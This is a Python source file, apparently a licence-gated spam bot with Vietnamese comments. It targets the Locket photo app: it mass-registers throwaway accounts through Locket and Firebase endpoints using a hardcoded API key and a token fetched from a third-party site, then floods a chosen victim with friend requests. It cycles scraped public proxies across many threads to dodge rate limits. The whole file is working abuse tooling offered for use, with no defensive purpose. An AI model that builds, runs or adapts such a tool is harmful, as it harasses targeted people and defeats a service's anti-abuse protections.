# spammer.py (phiên bản 2.1 - Tự động Fetch Proxy)
import requests
import re
import random
import string
import threading
import time
import queue
from typing import Optional, Callable
from keygen import validate_key as validate_license_from_file

# Lớp Spammer vẫn giữ nguyên, không cần thay đổi.
# ... (dán code lớp Spammer từ phiên bản 2.0 vào đây) ...
class Spammer:
    def __init__(self, proxy: str, target_uid: str, custom_name: str):
        # Hằng số và URL từ tool gốc
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.REQUEST_TIMEOUT = 15

        self.proxy_str = proxy
        self.proxies_dict = self._format_proxy(proxy)
        self.target_uid = target_uid
        self.custom_name = custom_name
        self.session = requests.Session()
        self.session.proxies = self.proxies_dict
        
        # Biến trạng thái
        self.firebase_app_check = SpamManager.FIREBASE_APP_CHECK_TOKEN # Lấy token tĩnh
        self.id_token = None
        self.local_id = None
        
    def _format_proxy(self, proxy_str):
        if not proxy_str: return None
        if not proxy_str.startswith(('http://', 'https://')):
            proxy_str = f"http://{proxy_str}"
        return {"http": proxy_str, "https": proxy_str}

    def _rand_str(self, length=10, chars=string.ascii_lowercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(length))

    # --- Các bước trong chuỗi spam ---
    
    def _create_account(self):
        email = f"{self._rand_str(15)}@thanhdieu.com"
        password = 'zlocket' + self._rand_str(7)
        payload = { "data": { "email": email, "password": password, "client_email_verif": True, "platform": "ios" } }
        headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.firebase_app_check}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return (email, password) if res.status_code == 200 else (None, None)
        except: return (None, None)
            
    def _sign_in(self, email, password):
        payload = {"email": email, "password": password, "returnSecureToken": True}
        headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.firebase_app_check}
        try:
            res = self.session.post(f"{self.FIREBASE_AUTH_URL}/verifyPassword?key={self.FIREBASE_API_KEY}", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            if res.status_code == 200 and 'idToken' in res.json():
                self.id_token, self.local_id = res.json()['idToken'], res.json()['localId']
                return True
            return False
        except: return False
            
    def _finalize_user(self):
        payload = { "data": { "username": self._rand_str(8, chars=string.ascii_lowercase), "last_name": "✨", "first_name": self.custom_name[:20] } }
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {self.id_token}'}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/finalizeTemporaryUser", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return res.status_code == 200
        except: return False

    def _send_friend_request(self):
        payload = {"data": {"user_uid": self.target_uid, "source": "signUp"}}
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {self.id_token}'}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/sendFriendRequest", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return res.status_code == 200
        except: return False
            
    def run_cycle(self):
        if not self.firebase_app_check: return "failed", 0
        email, password = self._create_account()
        if not email: return "failed", 0
        if not self._sign_in(email, password): return "failed", 0
        if not self._finalize_user(): return "failed", 0
        sent_count = 0
        for _ in range(16): # 1 request đầu + 15 boost
            if self._send_friend_request():
                sent_count += 1
            if sent_count == 0: return "failed", 0
        return "success", sent_count


class SpamManager:
    FIREBASE_APP_CHECK_TOKEN = None

    def __init__(self):
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        # === NEW === Thêm danh sách API proxy từ tool gốc
        self.PROXY_APIS = [
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=20000&country=all&ssl=all&anonymity=all',
        ]
        self.active_spam_sessions = {}
        self.proxy_queue = queue.Queue()
        SpamManager.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
        if not SpamManager.FIREBASE_APP_CHECK_TOKEN:
            print("[CRITICAL] Không thể lấy App Check Token. Chức năng spam sẽ không hoạt động.")

    def _fetch_app_check_token(self):
        try:
            res = requests.get(self.TOKEN_API_URL, timeout=15)
            return res.json().get("data", {}).get("token") if res.status_code == 200 else None
        except:
            print("[ERROR] Lỗi khi kết nối đến API lấy token.")
            return None
    
    # === CHANGED === Cải tiến _load_proxies để tự fetch từ API
    def _load_proxies(self):
        proxies = set() # Dùng set để tránh trùng lặp
        
        # 1. Thử tải từ proxy.txt trước (nếu có)
        try:
            with open('proxy.txt', 'r') as f:
                file_proxies = {line.strip() for line in f if line.strip()}
                if file_proxies:
                    print(f"[INFO] Đã tìm thấy {len(file_proxies)} proxies trong file proxy.txt.")
                    proxies.update(file_proxies)
        except FileNotFoundError:
            print("[INFO] Không tìm thấy file proxy.txt, sẽ chỉ dùng proxy từ API.")

        # 2. Fetch proxy từ các API
        for url in self.PROXY_APIS:
            try:
                print(f"[INFO] Đang lấy proxy từ {url.split('/')[2]}...")
                res = requests.get(url, timeout=15)
                res.raise_for_status()
                api_proxies = {line.strip() for line in res.text.splitlines() if line.strip()}
                print(f"[INFO] Lấy thành công {len(api_proxies)} proxies.")
                proxies.update(api_proxies)
            except requests.RequestException as e:
                print(f"[WARNING] Không thể lấy proxy từ {url.split('/')[2]}: {e}")
        
        if not proxies:
            print("[CRITICAL] Không có proxy nào được tải. Không thể bắt đầu spam.")
            return 0
        
        proxy_list = list(proxies)
        random.shuffle(proxy_list)
        
        # Xóa hàng đợi cũ và thêm proxy mới
        while not self.proxy_queue.empty():
            try:
                self.proxy_queue.get_nowait()
            except queue.Empty:
                break
                
        for p in proxy_list:
            self.proxy_queue.put(p)
            
        print(f"[INFO] Đã tải tổng cộng {len(proxy_list)} proxies duy nhất vào hàng đợi.")
        return len(proxy_list)
        
    def find_locket_uid(self, user_input: str) -> Optional[str]:
        # Logic này giữ nguyên
        user_input = user_input.strip()
        url_to_check = f"https://locket.cam/{user_input}" if not re.match(r'^https?://', user_input) else user_input
        try:
            response = requests.get(url_to_check, timeout=15, allow_redirects=True)
            response.raise_for_status()
            final_url = response.url
            match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', final_url)
            if match: return match.group(1)
            js_redirect_match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', response.text)
            if js_redirect_match:
                redirected_url = js_redirect_match.group(1)
                match_js = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', redirected_url)
                if match_js: return match_js.group(1)
            return None
        except requests.RequestException: return None
            
    def validate_license(self, key: str) -> dict:
        return validate_license_from_file(key)
        
    def start_spam_session(self, user_id: int, target: str, custom_name: str, num_threads: int, update_callback: Callable):
        if user_id in self.active_spam_sessions:
            update_callback(status="error", message="Bạn đã có một phiên spam đang chạy.")
            return
            
        target_uid = self.find_locket_uid(target)
        if not target_uid:
            update_callback(status="error", message=f"Không thể tìm thấy Locket UID từ `{target}`.")
            return

        # Tải lại proxy mỗi khi bắt đầu phiên mới
        if self._load_proxies() == 0:
            update_callback(status="error", message="Không tải được proxy nào. Vui lòng kiểm tra kết nối hoặc API proxy.")
            return

        stop_event = threading.Event()
        self.active_spam_sessions[user_id] = stop_event
        stats = {'accounts': 0, 'requests': 0, 'failed': 0, 'start_time': time.time(), 'proxies': self.proxy_queue.qsize()}

        # ... (Phần còn lại của hàm start_spam_session giữ nguyên)
        def spam_loop():
            worker_threads = []
            for i in range(min(num_threads, stats['proxies'])): # Chỉ tạo số luồng <= số proxy
                thread = threading.Thread(target=self._run_worker, args=(target_uid, custom_name, stop_event, stats))
                worker_threads.append(thread)
                thread.start()
            if not worker_threads:
                update_callback(status="error", message="Không có luồng nào được tạo (có thể do hết proxy).")
                return

            last_update = time.time()
            while not stop_event.is_set():
                if time.time() - last_update > 2:
                    stats['proxies'] = self.proxy_queue.qsize() # Cập nhật số proxy còn lại
                    update_callback(status="running", stats=stats)
                    last_update = time.time()
                
                if not any(t.is_alive() for t in worker_threads): break
                time.sleep(0.5)

            for t in worker_threads: t.join()
            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions: del self.active_spam_sessions[user_id]

        session_thread = threading.Thread(target=spam_loop)
        session_thread.daemon = True
        session_thread.start()
        update_callback(status="started", message=f"✅ Đã bắt đầu spam đến `{target_uid}` với **{min(num_threads, stats['proxies'])}** luồng.")
        
    def _run_worker(self, target_uid, custom_name, stop_event, stats):
        # ... (Hàm này giữ nguyên)
        while not stop_event.is_set():
            try:
                proxy = self.proxy_queue.get(timeout=1)
            except queue.Empty:
                break
            spammer_instance = Spammer(proxy, target_uid, custom_name)
            status, sent_count = spammer_instance.run_cycle()
            with threading.Lock():
                if status == "success":
                    stats['accounts'] += 1
                    stats['requests'] += sent_count
                else:
                    stats['failed'] += 1
            self.proxy_queue.put(proxy)

    def stop_spam_session(self, user_id: int) -> bool:
        if user_id in self.active_spam_sessions:
            self.active_spam_sessions[user_id].set()
            return True
        return False
